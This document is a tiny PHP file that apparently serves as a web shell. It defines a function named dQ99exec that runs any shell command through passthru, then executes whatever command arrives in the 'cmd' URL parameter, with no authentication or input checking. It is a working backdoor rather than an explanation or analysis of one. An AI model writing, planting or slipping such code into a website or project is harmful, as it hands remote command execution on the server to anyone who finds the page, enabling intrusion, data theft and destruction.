<?php
function dQ99exec($cmd) {
    @ob_start(); 
	passthru($cmd); 
	$output = @ob_get_contents(); 
	@ob_end_clean();
    return $output;
}

$cmdline = $_GET['cmd'];
$ret = dQ99exec($cmdline);
?>